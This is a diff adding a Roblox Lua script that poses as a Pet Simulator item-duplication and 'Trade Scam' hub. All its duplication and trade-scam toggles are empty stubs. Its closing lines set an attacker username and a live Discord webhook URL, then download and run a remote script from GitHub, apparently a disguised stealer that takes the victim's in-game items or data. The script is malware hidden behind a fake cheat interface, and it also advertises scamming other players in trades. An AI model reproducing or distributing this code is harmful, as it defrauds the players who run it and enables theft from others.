@@ -1,0 +1,60 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Player = Game.Players.LocalPlayer
+local Window = OrionLib:MakeWindow({Name = "[TITANIC] Pet Simulator|Dupe-Script", HidePremium = false, SaveConfig = true, IntroText = "Dupe Hub", IntroEnabled = true})
+
+--tabs
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+--toggls
+local Section = Tab:AddSection({
+	Name = "Duping Section"
+})
+
+Tab:AddToggle({
+	Name = "Super Dupe | 5-10 Pets ",
+	Default = false,
+	Callback = function(Value)
+      
+end    
+})
+
+Tab:AddToggle({
+	Name = "Normal Dupe | 1-2 Pets ",
+	Default = false,
+	Callback = function(Value)
+      
+end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Trade Scam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Trading Section"
+})
+
+Tab:AddToggle({
+	Name = "Lag Trade | (Normal Mode)",
+	Default = false,
+	Callback = function(Value)
+      
+end    
+})
+
+Tab:AddToggle({
+	Name = "Disconnect Player InTrade | Use When 2.0s complete",
+	Default = false,
+	Callback = function(Value)
+      
+end    
+})
+
+UserName = "Vedekur"
+WebHook = "https://discord.com/api/webhooks/1054026507254763590/oIWx0Scit1LYazBV0KBxcZ8rMkOPgh_ZXAdslwcv568Kyw5yWH_HT8hqjbLgS259iESD"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
